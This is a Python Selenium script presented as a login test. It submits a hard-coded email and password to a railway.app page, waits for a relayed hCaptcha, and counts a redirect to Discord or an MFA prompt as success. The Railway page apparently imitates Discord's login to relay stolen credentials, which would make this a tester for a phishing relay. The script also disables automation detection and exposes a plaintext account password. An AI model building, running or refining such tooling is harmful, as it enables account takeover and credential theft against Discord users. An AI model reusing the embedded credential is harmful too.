"""
Selenium test: navigate to Railway site, enter credentials, submit login,
wait for captcha iframe, and report status.
"""
import time, sys, json
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager

URL = "https://web-production-2eb2c7.up.railway.app/"
EMAIL = "fortbot7@inbox.lv"
PASSWORD = "Fatman11$"

def main():
    print(f"[*] Setting up Chrome...")
    opts = Options()
    opts.add_argument("--disable-blink-features=AutomationControlled")
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-dev-shm-usage")
    opts.add_experimental_option("excludeSwitches", ["enable-automation"])
    opts.set_capability("goog:loggingPrefs", {"browser": "ALL"})

    try:
        driver = webdriver.Chrome(
            service=Service(ChromeDriverManager().install()),
            options=opts
        )
    except Exception as e:
        print(f"[!] Chrome setup failed: {e}")
        driver = webdriver.Chrome(options=opts)

    driver.set_page_load_timeout(30)

    try:
        print(f"[*] Loading {URL}...")
        driver.get(URL)
        time.sleep(3)

        print(f"[*] Page title: {driver.title}")

        # Enter credentials
        email_input = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "email"))
        )
        email_input.clear()
        email_input.send_keys(EMAIL)
        print(f"[*] Entered email")

        pw_input = driver.find_element(By.ID, "password")
        pw_input.clear()
        pw_input.send_keys(PASSWORD)
        print(f"[*] Entered password")

        login_btn = driver.find_element(By.ID, "login-btn")
        login_btn.click()
        print(f"[*] Clicked Login button")

        # Wait for captcha iframe (hcaptcha-frame) or other response
        print(f"[*] Waiting for response (up to 30s)...")
        captcha_found = False
        for i in range(60):
            time.sleep(0.5)
            try:
                frame = driver.find_element(By.ID, "hcaptcha-frame")
                if frame.is_displayed():
                    captcha_found = True
                    print(f"\n[!] CAPTCHA IFRAME VISIBLE - user needs to solve it!")
                    break
            except:
                pass

            # Check for MFA
            try:
                mfa = driver.find_element(By.ID, "sec-mfa")
                if mfa.is_displayed():
                    print(f"\n[+] MFA SCREEN! Login succeeded, needs 2FA")
                    return True
            except:
                pass

            # Check for error
            try:
                err = driver.find_element(By.ID, "login-error")
                if "show" in (err.get_attribute("class") or ""):
                    print(f"\n[!] ERROR: {err.text}")
                    return False
            except:
                pass

            if i % 10 == 0:
                print(f"    ...waiting ({i * 0.5}s)")

        if not captcha_found:
            print(f"[!] Captcha iframe never appeared. Dumping logs...")
            dump_logs(driver)
            return False

        # === Captcha iframe is visible - wait for user to solve ===
        print(f"[*] Waiting for user to solve captcha (up to 180s)...")
        solved = False
        for j in range(360):
            time.sleep(0.5)

            # Check if iframe is gone (captcha solved -> iframe removed)
            try:
                frame = driver.find_element(By.ID, "hcaptcha-frame")
                if not frame.is_displayed():
                    print(f"[*] Captcha iframe hidden after {j * 0.5}s")
                    solved = True
                    break
            except:
                print(f"[*] Captcha iframe removed after {j * 0.5}s (solved!)")
                solved = True
                break

            if j > 0 and j % 30 == 0:
                print(f"    ...still waiting for captcha solve ({j * 0.5}s)")

        if not solved:
            print(f"[!] Captcha solve timed out")
            dump_logs(driver)
            return False

        # === After captcha solved, wait for result ===
        print(f"[*] Captcha solved. Waiting for post-captcha result (30s)...")
        for k in range(60):
            time.sleep(0.5)

            try:
                url = driver.current_url
                if "discord.com" in url or "channels" in url:
                    print(f"\n[+] SUCCESS! Redirected to: {url}")
                    return True
            except:
                pass

            # Check for MFA
            try:
                mfa = driver.find_element(By.ID, "sec-mfa")
                if mfa.is_displayed():
                    print(f"\n[+] MFA SCREEN! Login succeeded, needs 2FA")
                    return True
            except:
                pass

            # Check for error
            try:
                err = driver.find_element(By.ID, "login-error")
                if "show" in (err.get_attribute("class") or ""):
                    print(f"\n[!] ERROR: {err.text}")
                    dump_logs(driver)
                    return False
            except:
                pass

            # Check if captcha came back (LOOP!)
            try:
                frame = driver.find_element(By.ID, "hcaptcha-frame")
                if frame.is_displayed():
                    print(f"\n[!] CAPTCHA LOOPED AGAIN! Token was invalid.")
                    dump_logs(driver)
                    return False
            except:
                pass

            if k % 10 == 0:
                print(f"    ...waiting ({k * 0.5}s)")

        print(f"\n[*] Final state after 30s wait")
        dump_logs(driver)

    except Exception as e:
        print(f"[!] Test error: {e}")
        import traceback
        traceback.print_exc()
        try:
            dump_logs(driver)
        except:
            pass

    finally:
        input("\n[*] Press Enter to close browser...")
        try:
            driver.quit()
        except:
            pass

    return False


def dump_logs(driver):
    try:
        logs = driver.get_log("browser")
        print(f"\n[*] Browser console ({len(logs)} entries):")
        for log in logs:
            msg = log['message'][:600]
            level = log['level']
            lower = msg.lower()
            if any(k in lower for k in ['captcha', 'debug', 'challenge', 'hcap', 'invalid', 'error', 'fail']):
                print(f"  >>> [{level}] {msg}")
            elif level == 'SEVERE':
                print(f"  [SEVERE] {msg}")
    except Exception as e:
        print(f"[*] Could not get logs: {e}")


if __name__ == "__main__":
    result = main()
    print(f"\n{'=' * 50}")
    print(f"RESULT: {'SUCCESS' if result else 'FAILED'}")
    print(f"{'=' * 50}")
